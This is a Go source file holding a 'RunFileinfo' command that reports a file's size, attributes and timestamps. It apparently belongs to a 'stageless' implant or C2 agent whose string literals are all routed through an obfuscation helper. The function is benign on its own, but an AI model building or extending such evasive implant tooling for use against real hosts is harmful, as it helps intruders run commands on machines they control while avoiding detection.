package capabilities

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"

	general "stageless/utils/general"
	"stageless/utils/obf"
)

func RunFileinfo(args string) []byte {
	// Main function that prints file info for a path
	path := strings.TrimSpace(args)
	if path == "" {
		return WriteMsg(obf.S("Error: missing path"))
	}
	info, err := os.Lstat(path)
	if err != nil {
		return WriteMsg(obf.S("Error: path not found"))
	}
	st, ok := info.Sys().(*syscall.Stat_t)
	if !ok {
		return WriteMsg(obf.S("Error: path not found"))
	}
	isDir := info.IsDir()
	sz := info.Size()
	sizeHuman := obf.S("-")
	if !isDir {
		sizeHuman = general.FmtSize(uint64(sz))
	}
	attrs := uint32(st.Mode)
	attrLbl := ""
	if isDir {
		attrLbl += obf.S("D")
	}
	base := path
	if i := strings.LastIndex(base, "/"); i >= 0 {
		base = base[i+1:]
	}
	if len(base) > 0 && base[0] == '.' {
		attrLbl += obf.S("H")
	}
	if st.Mode&0o200 == 0 {
		attrLbl += obf.S("R")
	}
	if attrLbl == "" {
		attrLbl = obf.S("-")
	}
	typeLbl := obf.S("file")
	if isDir {
		typeLbl = obf.S("directory")
	}
	formatTime := func(sec int64) string {
		// Formats a unix time value
		if sec <= 0 {
			return obf.S("-")
		}
		return time.Unix(sec, 0).Format("2006-01-02 15:04:05")
	}
	var b strings.Builder
	b.WriteString(obf.S("path: "))
	b.WriteString(path)
	b.WriteByte('\n')
	b.WriteString(obf.S("type: "))
	b.WriteString(typeLbl)
	b.WriteByte('\n')
	b.WriteString(fmt.Sprintf("size: %s (%d bytes)\n", sizeHuman, sz))
	b.WriteString(fmt.Sprintf("attributes: 0x%08x %s\n", attrs, attrLbl))
	created := obf.S("-")
	if st.Birthtimespec.Sec > 0 {
		created = formatTime(st.Birthtimespec.Sec)
	}
	b.WriteString(obf.S("created: "))
	b.WriteString(created)
	b.WriteByte('\n')
	b.WriteString(obf.S("accessed: "))
	b.WriteString(formatTime(st.Atimespec.Sec))
	b.WriteByte('\n')
	b.WriteString(obf.S("modified: "))
	b.WriteString(formatTime(st.Mtimespec.Sec))
	b.WriteByte('\n')
	return WriteMsg(b.String())
}
